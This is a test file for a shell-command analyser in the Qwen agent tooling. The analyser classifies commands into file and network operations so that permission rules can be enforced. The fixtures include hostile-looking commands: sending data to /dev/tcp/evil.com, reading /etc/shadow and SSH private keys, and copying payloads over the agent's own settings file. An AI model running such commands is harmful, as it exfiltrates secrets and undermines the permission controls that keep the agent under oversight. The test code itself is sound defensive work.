/**
 * @license
 * Copyright 2025 Qwen team
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect } from 'vitest';
import {
  extractShellOperations,
  extractShellOperationsAcrossCommand,
} from './shell-semantics.js';
import type { ShellOperation } from './shell-semantics.js';

const CWD = '/home/user/project';
const SETTINGS = `${CWD}/.qwen/settings.json`;
const REPO_SETTINGS = '/repo/.qwen/settings.json';

// Helper: sort ops for stable comparison
function sorted(ops: ShellOperation[]) {
  return [...ops].sort((a, b) =>
    `${a.virtualTool}:${a.filePath ?? ''}:${a.domain ?? ''}`.localeCompare(
      `${b.virtualTool}:${b.filePath ?? ''}:${b.domain ?? ''}`,
    ),
  );
}

const fileOp =
  (virtualTool: ShellOperation['virtualTool']) =>
  (filePath: string): ShellOperation => ({ virtualTool, filePath });
const read = fileOp('read_file');
const write = fileOp('write_file');
const edit = fileOp('edit');
const dir = fileOp('list_directory');
const web = (domain: string): ShellOperation => ({
  virtualTool: 'web_fetch',
  domain,
});
/** A write whose path was resolved against a cwd the analysis cannot know. */
const uncertainWrite = (
  filePath: string,
  pathMayDependOnCwd = true,
): ShellOperation => ({
  virtualTool: 'write_file',
  filePath,
  cwdUnknown: true,
  pathMayDependOnCwd,
});
const ops = (command: string) => extractShellOperations(command, CWD);
const across = (command: string) =>
  extractShellOperationsAcrossCommand(command, '/repo');
const expectSorted = (command: string, expected: ShellOperation[]) =>
  expect(sorted(ops(command))).toEqual(expected);
type Row = [title: string, command: string, expected: ShellOperation[]];

describe('extractShellOperations', () => {
  it.each<Row>([
    ['returns [] for empty string', '', []],
    ['returns [] for whitespace', '   ', []],
    ['returns [] for unknown commands', 'frobnicate /etc/passwd', []],
    ['returns [] for env-var assignments', 'FOO=bar', []],
    ['cat: absolute path', 'cat /etc/passwd', [read('/etc/passwd')]],
    [
      'cat: relative path resolved against cwd',
      'cat secrets.txt',
      [read(`${CWD}/secrets.txt`)],
    ],
    ['cat: flags are ignored', 'cat -n /etc/hosts', [read('/etc/hosts')]],
    [
      'cat: quoted path',
      "cat '/etc/my file.conf'",
      [read('/etc/my file.conf')],
    ],
    [
      'head: -n value not treated as path',
      'head -n 10 /var/log/syslog',
      [read('/var/log/syslog')],
    ],
    [
      'grep: first positional is pattern, rest are files',
      'grep password /etc/shadow',
      [read('/etc/shadow')],
    ],
    ['grep: -r becomes list_directory', 'grep -r secret /etc', [dir('/etc')]],
    // -f consumes patterns.txt and sets hasPatternFlag, so every positional
    // is a file path (no slice(1)).
    [
      'grep: -f patternfile — positionals are file paths',
      'grep -f patterns.txt /etc/hosts',
      [read('/etc/hosts')],
    ],
    [
      'grep: -A value not treated as path',
      'grep -A 3 error /var/log/app.log',
      [read('/var/log/app.log')],
    ],
    ['ls: no args defaults to cwd', 'ls', [dir(CWD)]],
    ['ls: explicit dir', 'ls /var/log', [dir('/var/log')]],
    [
      'find: first positional is starting dir',
      'find /etc -name "*.conf"',
      [dir('/etc')],
    ],
    ['find: no starting dir defaults to cwd', 'find -name "*.txt"', [dir(CWD)]],
    [
      'find: extracts write ops from exec clauses',
      'find . -exec cp payload .qwen/settings.json ;',
      [dir(CWD), read(`${CWD}/payload`), write(SETTINGS)],
    ],
    [
      'touch: creates a file (write_file)',
      'touch /tmp/new.txt',
      [write('/tmp/new.txt')],
    ],
    [
      'mkdir: creates a directory (write_file)',
      'mkdir -p /tmp/a/b',
      [write('/tmp/a/b')],
    ],
    [
      'rm: single file is edit',
      'rm /tmp/secret.txt',
      [edit('/tmp/secret.txt')],
    ],
    ['rm -rf: directory is edit', 'rm -rf /tmp/dir', [edit('/tmp/dir')]],
    [
      'chmod: mode arg is skipped, file is edit',
      'chmod 755 /usr/local/bin/script',
      [edit('/usr/local/bin/script')],
    ],
    [
      'chown: owner arg is skipped, file is edit',
      'chown root:root /etc/config',
      [edit('/etc/config')],
    ],
    [
      'sed without -i: read_file',
      "sed 's/foo/bar/' /etc/hosts",
      [read('/etc/hosts')],
    ],
    ['sed -i: edit', "sed -i 's/foo/bar/' /etc/hosts", [edit('/etc/hosts')]],
    [
      'sed combined short flags containing i: edit',
      "sed -nie 's/foo/bar/' /etc/hosts",
      [edit('/etc/hosts')],
    ],
    [
      'awk: program expression filtered, file identified',
      "awk '{print $1}' /etc/passwd",
      [read('/etc/passwd')],
    ],
    [
      'awk -F: separator consumed, file identified',
      "awk -F: '{print $2}' /etc/shadow",
      [read('/etc/shadow')],
    ],
    [
      'awk -i inplace: edits files in place',
      'awk -i inplace \'{gsub(/x/, "y")}1\' /etc/hosts',
      [edit('/etc/hosts')],
    ],
    [
      'awk --include=inplace: edits files in place',
      'awk --include=inplace \'{gsub(/x/, "y")}1\' /etc/hosts',
      [edit('/etc/hosts')],
    ],
    [
      'gawk -i inplace: edits files in place',
      'gawk -i inplace \'{gsub(/x/, "y")}1\' /etc/hosts',
      [edit('/etc/hosts')],
    ],
    [
      'redirect >: write_file',
      'echo hello > /tmp/out.txt',
      [write('/tmp/out.txt')],
    ],
    [
      'redirect >>: write_file',
      'date >> /var/log/app.log',
      [write('/var/log/app.log')],
    ],
    [
      'curl: extracts domain',
      'curl https://api.example.com/data',
      [web('api.example.com')],
    ],
    [
      'wget: extracts domain',
      'wget https://example.com/file.tar.gz',
      [web('example.com')],
    ],
    [
      'sudo cat: transparent wrapper',
      'sudo cat /etc/sudoers',
      [read('/etc/sudoers')],
    ],
    [
      'sudo -u user cat: strips flags before inner cmd',
      'sudo -u root cat /etc/shadow',
      [read('/etc/shadow')],
    ],
    [
      'env cmd: transparent wrapper',
      'env cat /etc/hosts',
      [read('/etc/hosts')],
    ],
    [
      'timeout cmd: transparent wrapper',
      'timeout 30 wget https://example.com',
      [web('example.com')],
    ],
    // $SECRET_FILE starts with $, filtered by looksLikePath
    ['$VAR paths are not included', 'cat $SECRET_FILE', []],
  ])('%s', (_title, command, expected) => {
    expect(ops(command)).toEqual(expected);
  });

  const curlOut = [web('api.example.com'), write('/tmp/out.json')];
  const wgetOut = [web('example.com'), write('/tmp/file.gz')];
  it.each<Row>([
    ['cat: multiple files', 'cat /a/b /c/d', [read('/a/b'), read('/c/d')]],
    [
      'tail: multiple files with flag',
      'tail -c 100 /a /b',
      [read('/a'), read('/b')],
    ],
    ['diff: two files', 'diff /old /new', [read('/new'), read('/old')]],
    [
      'grep: -e flag shifts all positionals to paths',
      'grep -e password /etc/passwd /etc/shadow',
      [read('/etc/passwd'), read('/etc/shadow')],
    ],
    [
      'cp: src=read, dst=write',
      'cp /etc/passwd /tmp/backup',
      [read('/etc/passwd'), write('/tmp/backup')],
    ],
    [
      'mv: src=edit, dst=write',
      'mv /tmp/a /tmp/b',
      [edit('/tmp/a'), write('/tmp/b')],
    ],
    [
      'sed -e: all positionals are files',
      "sed -e 's/foo/bar/' /a /b",
      [read('/a'), read('/b')],
    ],
    [
      'dd if= and of=',
      'dd if=/dev/sda of=/tmp/disk.img',
      [read('/dev/sda'), write('/tmp/disk.img')],
    ],
    [
      'rsync destination is a write',
      'rsync /tmp/payload .qwen/settings.json',
      [read('/tmp/payload'), write(SETTINGS)],
    ],
    [
      'curl: -o flag value emits write op and is not treated as URL',
      'curl -o /tmp/out.json https://api.example.com',
      curlOut,
    ],
    [
      'curl: attached -o flag value emits write op',
      'curl -o/tmp/out.json https://api.example.com',
      curlOut,
    ],
    [
      'curl: attached -o= flag value emits write op',
      'curl -o=/tmp/out.json https://api.example.com',
      curlOut,
    ],
    [
      'wget: -O flag value emits write op and is not treated as URL',
      'wget -O /tmp/file.gz https://example.com/f.gz',
      wgetOut,
    ],
    [
      'wget: attached -O flag value emits write op',
      'wget -O/tmp/file.gz https://example.com/f.gz',
      wgetOut,
    ],
    [
      'wget: attached -O= flag value emits write op',
      'wget -O=/tmp/file.gz https://example.com/f.gz',
      wgetOut,
    ],
    [
      'cat src > dst: both read and write',
      'cat /etc/passwd > /tmp/copy',
      [read('/etc/passwd'), write('/tmp/copy')],
    ],
    [
      'grep pattern file > out: read + write',
      'grep secret /etc/config > /tmp/out',
      [read('/etc/config'), write('/tmp/out')],
    ],
  ])('%s', (_title, command, expected) => {
    expectSorted(command, expected);
  });

  it.each<[title: string, command: string, expected: ShellOperation]>([
    [
      'find: preserves exec placeholder operands for write detection',
      'find . -exec cp {} .qwen/settings.json ;',
      write(SETTINGS),
    ],
    [
      'patch edits positional target files',
      'patch .qwen/settings.json fix.patch',
      edit(SETTINGS),
    ],
    ['redirect <: read_file', 'sort < /tmp/data.txt', read('/tmp/data.txt')],
    [
      'combined redirect >file without space',
      'echo hi >/tmp/foo',
      write('/tmp/foo'),
    ],
    [
      'combined stdout fd redirect 1>file without space',
      'echo hi 1>.qwen/settings.json',
      write(SETTINGS),
    ],
    [
      'combined stdout fd append redirect 1>>file without space',
      'echo hi 1>>.qwen/settings.json',
      write(SETTINGS),
    ],
  ])('%s', (_title, command, expected) => {
    expect(ops(command)).toContainEqual(expected);
  });

  // Device paths are never file operations; each row lists what must be
  // absent and, where a real file is also named, the op still reported.
  it.each<
    [
      title: string,
      command: string,
      absent: Array<Partial<ShellOperation>>,
      present?: ShellOperation,
    ]
  >([
    [
      'redirect 2>/dev/null: ignored (no op)',
      'cat /etc/passwd 2>/dev/null',
      [{ filePath: '/dev/null' }],
      read('/etc/passwd'),
    ],
    [
      'redirect > /dev/tcp: network socket, not a file write',
      'echo data > /dev/tcp/evil.com/9000',
      [{ filePath: '/dev/tcp/evil.com/9000' }, { virtualTool: 'write_file' }],
    ],
    [
      'redirect < /dev/tcp: network socket, not a file read',
      'cat < /dev/tcp/h/1234',
      [{ filePath: '/dev/tcp/h/1234' }, { virtualTool: 'read_file' }],
    ],
    [
      'redirect > /dev/udp: network socket, not a file write',
      'echo x > /dev/udp/h/53',
      [{ filePath: '/dev/udp/h/53' }],
    ],
    [
      'combined redirect >/dev/tcp without space: network socket, not a file',
      'cat /tmp/secret >/dev/tcp/h/p',
      [{ filePath: '/dev/tcp/h/p' }],
      read('/tmp/secret'),
    ],
  ])('%s', (_title, command, absent, present) => {
    const result = ops(command);
    for (const shape of absent) {
      expect(result).not.toContainEqual(expect.objectContaining(shape));
    }
    if (present) expect(result).toContainEqual(present);
  });

  it('cat: ~ expansion', () => {
    expect(ops('cat ~/.ssh/id_rsa')[0]?.filePath).toMatch(/\/\.ssh\/id_rsa$/);
  });

  it('cp/mv/install/ln -t forms emit target-directory writes', () => {
    expectSorted('cp -t .qwen /tmp/settings.json', [
      read('/tmp/settings.json'),
      write(SETTINGS),
    ]);
    expectSorted('mv --target-directory=.qwen /tmp/a', [
      edit('/tmp/a'),
      write(`${CWD}/.qwen/a`),
    ]);
    expectSorted('install -t .qwen /tmp/tool', [
      read('/tmp/tool'),
      write(`${CWD}/.qwen/tool`),
    ]);
    expectSorted('ln -t .qwen /tmp/target', [
      read('/tmp/target'),
      write(`${CWD}/.qwen/target`),
    ]);
    expectSorted('cp -rt .qwen /tmp/payload', [
      read('/tmp/payload'),
      write(`${CWD}/.qwen/payload`),
    ]);
  });

  it('perl -i edits file operands', () => {
    expect(ops("perl -i -pe 's/x/y/' .qwen/settings.json")).toEqual([
      edit(SETTINGS),
    ]);
    expect(ops("perl -i -e 's/x/y/' .qwen/settings.json")).toEqual([
      edit(SETTINGS),
    ]);
  });

  it('patch edits output flag targets', () => {
    for (const command of [
      'patch --output=.qwen/settings.json -i fix.patch',
      'patch -o .qwen/settings.json -i fix.patch',
    ]) {
      expect(ops(command)).toContainEqual(edit(SETTINGS));
    }
  });

  it('sort -o emits the output path as a write', () => {
    expectSorted('sort -o .qwen/settings.json /tmp/in', [
      read('/tmp/in'),
      write(SETTINGS),
    ]);
    expectSorted('sort --output=.qwen/settings.json /tmp/in', [
      read('/tmp/in'),
      write(SETTINGS),
    ]);
  });

  it('regression: ordinary file redirects still tracked', () => {
    expect(ops('echo hi > out.txt')).toContainEqual(write(`${CWD}/out.txt`));
    expect(ops('sort < in.txt')).toContainEqual(read(`${CWD}/in.txt`));
  });
});

// Shared compound shell analysis for permission rules and AUTO review.
describe('extractShellOperationsAcrossCommand', () => {
  it.each<Row>([
    [
      'tracks literal `cd` across compound segments before resolving writes',
      "cd .qwen && bash -lc 'echo {} > settings.json'",
      [write(REPO_SETTINGS)],
    ],
    [
      'handles leading env assignments before redirected commands',
      'FOO=bar echo x > .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'handles leading env assignments before write commands',
      'FOO=bar tee .qwen/settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'tracks cwd before leading env assignments',
      "cd .qwen && FOO=bar echo '{}' > settings.json",
      [write(REPO_SETTINGS)],
    ],
    // The foreground form below cannot know where it landed; the backgrounded
    // one can, because it did not move the cwd at all.
    [
      'does not mark later paths uncertain for a backgrounded dynamic `cd`',
      'cd "$TARGET" & echo {} > settings.json',
      [write('/repo/settings.json')],
    ],
    // Over-correction guards: only the backgrounded `cd` is exempt. Both of
    // these pass before and after the change.
    [
      'keeps a foreground `cd` moving the cwd',
      'cd /tmp && echo {} > settings.json',
      [write('/tmp/settings.json')],
    ],
    [
      'keeps a foreground dynamic `cd` marking later paths uncertain',
      'cd "$TARGET" && echo {} > settings.json',
      [uncertainWrite('/repo/settings.json')],
    ],
    [
      'applies a foreground `cd` that follows a backgrounded one',
      'cd /tmp & cd /var && echo {} > settings.json',
      [write('/var/settings.json')],
    ],
    // The actual write is nested two wrapper levels deep.
    [
      'recursively unwraps nested shell wrappers',
      'bash -lc "sh -c \'echo hi > .mcp.json\'"',
      [write('/repo/.mcp.json')],
    ],
    [
      'preserves sibling segments after a shell wrapper',
      "bash -lc 'echo ok' && echo hi > .qwen/settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'splits literal newlines as command boundaries',
      'cd .qwen\ncp /tmp/malicious settings.json',
      [read('/tmp/malicious'), write(REPO_SETTINGS)],
    ],
    [
      'tracks cwd through brace-grouped commands',
      "{ cd .qwen && echo '{}' > settings.json; }",
      [write(REPO_SETTINGS)],
    ],
    [
      'strips grouping and background syntax from command and path tokens',
      '(echo > .qwen/settings.json) && echo > .qwen/hooks/run.sh&',
      [write(REPO_SETTINGS), write('/repo/.qwen/hooks/run.sh')],
    ],
    [
      'does not treat heredoc body lines as executable shell segments',
      [
        'cd .qwen',
        "cat <<'EOF'",
        'cd /tmp',
        'EOF',
        'echo > settings.json',
      ].join('\n'),
      [write(REPO_SETTINGS)],
    ],
    [
      'does not treat quoted heredoc-looking text as a heredoc marker',
      ["echo '<<EOF'", 'cd .qwen', "echo '{}' > settings.json"].join('\n'),
      [write(REPO_SETTINGS)],
    ],
    [
      'handles `cd --` and other POSIX flag forms before the target',
      "cd -- .qwen && printf '{}' > settings.local.json",
      [write('/repo/.qwen/settings.local.json')],
    ],
    [
      'treats the word after `cd --` as the target even when it starts with dash',
      "cd -- -some-dir && printf '{}' > settings.local.json",
      [write('/repo/-some-dir/settings.local.json')],
    ],
    [
      'ignores redirects attached to cd when resolving static cwd',
      "cd .qwen >/dev/null && echo '{}' > settings.json",
      [write(REPO_SETTINGS)],
    ],
    [
      'tracks static pushd targets like cd targets',
      "pushd .qwen && printf '{}' > settings.local.json",
      [write('/repo/.qwen/settings.local.json')],
    ],
    [
      'marks writes after popd as cwd-unknown',
      "popd && printf '{}' > settings.local.json",
      [uncertainWrite('/repo/settings.local.json')],
    ],
    [
      'marks writes after popd with expansion args as cwd-unknown',
      "popd $DIR && printf '{}' > settings.local.json",
      [uncertainWrite('/repo/settings.local.json')],
    ],
    // Keep the guessed path, but mark it unsafe to trust as final.
    [
      'marks relative writes after dynamic `cd` targets as cwd-unknown',
      'cd $TARGET && echo hi > out.txt',
      [uncertainWrite('/repo/out.txt')],
    ],
    [
      'marks all file ops after dynamic `cd` as cwd-unknown',
      'cd "$QWEN_HOME" && echo hi > ../settings.json',
      [uncertainWrite('/settings.json')],
    ],
    [
      'clears cwd-unknown after an absolute static `cd`',
      'cd $TARGET && cd /repo/.qwen && echo hi > settings.json',
      [write(REPO_SETTINGS)],
    ],
    [
      'preserves operation order across compound segments',
      'echo a > one.txt && cd sub && echo b > two.txt; cat /etc/hosts',
      [write('/repo/one.txt'), write('/repo/sub/two.txt'), read('/etc/hosts')],
    ],
    [
      'returns no ops when only `cd` segments are present',
      'cd .qwen && cd ..',
      [],
    ],
  ])('%s', (_title, command, expected) => {
    expect(across(command)).toEqual(expected);
  });

  // A backgrounded `cd` runs in a subshell, so the parent's cwd is untouched
  // and the next segment's relative write lands in the *original* directory —
  // which is exactly where a protected settings file lives. Attributing the
  // write to the `cd` target instead would check the wrong path.
  it.each([
    ['cd /tmp & echo {} > settings.json'],
    ['cd .qwen & echo {} > settings.json'],
  ])('does not move the cwd for the backgrounded `cd` in %s', (command) => {
    expect(across(command)).toEqual([write('/repo/settings.json')]);
  });

  it.each(['pushd', 'pushd +2', 'pushd -2', 'pushd -n /tmp'])(
    'marks writes after `%s` as cwd-unknown',
    (command) => {
      expect(across(`${command} && printf '{}' > settings.local.json`)).toEqual(
        [uncertainWrite('/repo/settings.local.json')],
      );
    },
  );

  it('does not mark absolute writes after dynamic `cd` as cwd-dependent', () => {
    for (const command of [
      'cd "$QWEN_HOME" && echo hi > /tmp/out.txt',
      'cd "$QWEN_HOME" && echo hi 1>/tmp/out.txt',
    ]) {
      expect(across(command)).toEqual([uncertainWrite('/tmp/out.txt', false)]);
    }
  });

  it('falls back gracefully on excessively deep wrapper nesting', () => {
    // A pathological chain hits MAX_SHELL_UNWRAP_DEPTH (4) and the remainder
    // is analysed as-is instead of recursing forever. The result does not
    // matter, only that the call returns without throwing or hanging.
    const deep = 'bash -lc "bash -lc \\"bash -lc \'bash -lc echo > x.txt\'\\""';
    expect(() => across(deep)).not.toThrow();
  });
});
